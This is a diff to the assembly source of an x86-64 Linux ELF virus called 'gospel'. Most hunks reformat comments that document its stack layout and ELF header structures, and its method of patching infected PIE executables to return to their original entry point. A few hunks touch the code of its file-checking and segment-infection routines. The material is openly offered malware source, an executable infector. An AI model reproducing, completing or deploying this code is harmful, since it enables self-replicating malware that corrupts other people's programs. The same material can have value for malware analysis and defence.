@@ -112,36 +112,42 @@ BITS 64
 ;  
 ;*******************************************************************************
 ; gospel stack layout:
-; stacks on stacks on stacks on I'm doing this bc a .bss section for a virus
+; stacks on stacks on stacks 
+; I'm doing this because a .bss section for a virus
 ; is a nightmare to deal with
 ; so, yw,  I've written out the stack layout 4 u
 ; il n'y a plus de cauchemars
-; jtm xoxo
+; jtm 
+; xoxo
 ;
 ; Note that I use r14 here rather than rsp
-; This is because gospel begins by reserving 0x2000 bytes on the stack 
-; and then moving the saved value of [rsp - 0x2000] to r14
-;*******************************************************************************
+; This is because gospel begins by reserving 0x2000 bytes on 
+; the stack and then moving the saved value of [rsp - 0x2000] to r14
+; 
+;***************************************************************
+;
+;//////////  filestat struct //////////////
+;
 ; r14 	 =	struc filestat
-; r14 + 0			.st_dev			resq	1	;IDofdevcontainingfile
-; r14 +	8			.st_ino			resq	1	;inode#
-; r14 + 16			.st_mode		resd	1	;mode
-; r14 + 20			.st_nlink		resd	1	;#ofhardlinks
-; r14 + 24			.st_uid			resd	1	;useridofowner
-; r14 + 28			.st_gid			resd	1	;groupIdofowner
-; r14 + 32			.st_rdev		resq	1	;devID
-; r14 + 40			.st_pad1		resq	1	;padding
-; r14 + 48			.st_size		resd	1	;totalsizeinbytes
-; r14 + 52			.st_blksize		resq	1	;blocksizeforfsi/o
-; r14 + 60			.st_pad2		resd	1	;padding
-; r14 + 68			.st_blocks		resq	1	;#of512bblocksallocated
-; r14 + 76			.st_atime		resq	1	;timeoflastfileaccess
-; r14 + 84			.st_mtime		resq	1	;timeoflastfilemod
-; r14 + 92			.st_ctime		resq	1	;timeoflastfilestatuschange
+; r14 + 0		.st_dev			resq		1 ;IDdevcontainingfile
+; r14 +	8		.st_ino			resq		1	;inode#
+; r14 + 16		.st_mode		resd		1	;mode
+; r14 + 20		.st_nlink		resd		1	;#ofhardlinks
+; r14 + 24		.st_uid			resd		1	;useridofowner
+; r14 + 28		.st_gid			resd		1	;groupIdofowner
+; r14 + 32		.st_rdev		resq		1	;devID
+; r14 + 40		.st_pad1		resq		1	;padding
+; r14 + 48		.st_size		resd		1	;totalsizeinbytes
+; r14 + 52		.st_blksize		resq		1	;blocksizeforfsi/o
+; r14 + 60		.st_pad2		resd		1	;padding
+; r14 + 68		.st_blocks		resq 		1;#of512bblocksalloc'd
+; r14 + 76		.st_atime		resq		1 ;timelastfileaccess
+; r14 + 84		.st_mtime		resq		1 ;timeoflastfilemod
+; r14 + 92		.st_ctime		resq 		1 ;timelastfilechange
 ; ...
 ; r14 + 144 end struc
 ;
-; ***Return to OEP instructions***
+;//////////   ***Return to OEP instructions*** //////////////
 ; Instructions for returning to original entry point of PIE host ELF
 ; after conclusion of vx routines; appended to end of vx body
 
@@ -163,10 +169,13 @@ BITS 64
 ;[r14 + 175] = 0x24048b48		;mov rax, [rsp]; <- call get_rip
 ;[r14 + 179] = 0xc3				;ret 
 		
+;//////////  Local variables //////////////
+; 	(used for phdr and shdr manipulation routines 
 ;
 ; r14 + 200 = local filename (saved from dirent.d_nameq)
 ;
-; variables used for phdr and shdr manipulation routines
+;	...
+;
 ; r14 + 400 ; evaddr: dq 0 
 ; r14 + 408 ; oshoff: dq 0		;original section header offset
 ; r14 + 416 ; fd:	dq 0
@@ -175,9 +184,12 @@ BITS 64
 ; r14 + 436 ; vxoffset: dd 0
 ; r14 + 440 ; vxshoff: dd 0
 ; r14 + 444 ; vx_padding_size: dd 0
-; r14 + 448 ; original_entry_point: dd 0
+; r14 + 448 ; original_entry_point: dq 0
 ;
 ; r14 + 500 = # of dirent entries returned from getdents64 syscall 
+;
+;
+;//////////  dirent struct //////////////
 ;
 ; r14 + 600 = 	struc linuxdirent
 ; r14 + 600			.d_ino:			resq	1
@@ -186,6 +198,9 @@ BITS 64
 ; r14 + 618			.d_nameq:		resb	1
 ; r14 + 619			.d_type:		resb	1
 ; r14 + 620		endstruc
+;
+;
+;////////// ELF Header //////////////
 ;
 ; r14 + 800 = mmap'd copy of host ELF executable to infect
 ; r14 + 800 	struc elf_ehdr
@@ -212,6 +227,9 @@ BITS 64
 ; r14 + 862			.e_shstrndx		resb	2		;uint16_t, bytes 62-63
 ; r14 + 864		endstruc
 ;
+;
+;////////// ELF Program Headers //////////////
+;
 ; the ELF Program headers will exist as entries in the PHdr table
 ; we ofc won't know ahead of time how many entries there are
 ; but we do know the offsets to all the fields of each Phdr entry
@@ -236,6 +254,8 @@ BITS 64
 ;  r14 + 800 + elf_ehdr.e_phoff + 48	.p_align		resq 1		; uint64_t   
 ;  r14 + 800 + elf_ehdr.e_phoff + 56	endstruc
 ;
+;
+;////////// ELF Section Headers //////////////
 ;
 ; We can use the same breakdown of offsets for the ELF Section Headers:
 ;
@@ -379,6 +399,7 @@ check_file:
 			inc rdi
 			cmp byte [rsi], 0x0
 			jne .copy_filename_loop
+		mov word [rdi], 0x5c00
 		xor rax, rax
 		xor r12, r12
 		jmp get_vx_name
@@ -627,7 +648,7 @@ infect:
 			cmp word [r13 + r12], 0x1			
 			jne .mod_subsequent_phdr
 			.mod_curr_header:
-				;check elf_phdr.p_flags == PFLAG_R | PFLAG_X			
+					;check elf_phdr.p_flags == PFLAG_R | PFLAG_X			
 				cmp dword [r13 + r12 + 4], 0x5	
 				je .mod_phdr_text_segment			
 				jmp .mod_subsequent_phdr
@@ -967,4 +988,3 @@ _end:
 	xor rdi, rdi
 	mov rax, 0x3c 				;exit() syscall on x64: SYS_EXIT equ 0x3c
 	syscall	
-
